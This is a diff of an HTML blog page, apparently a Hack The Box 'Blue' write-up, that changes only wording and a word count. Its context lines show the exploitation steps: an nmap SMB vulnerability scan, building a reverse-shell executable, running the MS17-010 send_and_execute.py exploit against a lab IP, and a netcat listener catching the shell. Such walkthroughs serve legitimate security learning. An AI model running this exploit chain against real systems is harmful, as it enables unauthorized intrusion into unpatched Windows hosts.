@@ -56,7 +56,7 @@
         },
         "datePublished": "2023-10-30",
         "description": "Writeup for HTB Blue",
-        "wordCount":  625 ,
+        "wordCount":  626 ,
         "mainEntityOfPage": "True",
         "dateModified": "2023-10-30",
         "image": {
@@ -233,7 +233,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 116.50 seconds
-</span></span></code></pre></div><p>This is likely to be SMB vulnerability.</p>
+</span></span></code></pre></div><p>This is likely an SMB vulnerability.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/parallels/blue<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─# nmap -sV -sC -sT --script<span class="o">=</span>smb-vuln* 10.129.80.136                                                                    <span class="m">1</span> ⨯
 </span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-30 22:49 EET
@@ -279,7 +279,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">Payload size: <span class="m">324</span> bytes
 </span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">73802</span> bytes
 </span></span><span class="line"><span class="cl">Saved as: reverse_shell.exe
-</span></span></code></pre></div><p>Made reverse shell.</p>
+</span></span></code></pre></div><p>Created a reverse shell.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/parallels/blue<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─# python send_and_execute.py 10.129.80.136 ./reverse_shell.exe
 </span></span><span class="line"><span class="cl">Trying to connect to 10.129.80.136:445
@@ -315,7 +315,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">nca_s_proto_error
 </span></span><span class="line"><span class="cl">Done
 </span></span></code></pre></div><p><a href="https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py"></a></p>
-<p>I run the script above and got the shell</p>
+<p>I ran the script above and got the shell</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/home/parallels/blue/AutoBlue-MS17-010<span class="o">]</span>
 </span></span><span class="line"><span class="cl">└─# rlwrap nc -lvnp <span class="m">4444</span>                                                                                                  <span class="m">1</span> ⨯
 </span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
@@ -327,7 +327,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span></code></pre></div><h1 id="root-code">Root code</h1>
 <p><img src="Blue%203093795c1edc4ced88d2327361535a2c/Screenshot_2023-10-30_at_23.20.49.png" alt="Screenshot 2023-10-30 at 23.20.49.png"></p>
 <h1 id="note">Note</h1>
-<p>Don’t forget to run vulnerability script on nmap. Could be useful.</p>
+<p>Don’t forget to run vulnerability scripts with Nmap. They could be useful.</p>
 
             </div>
         </article></main>
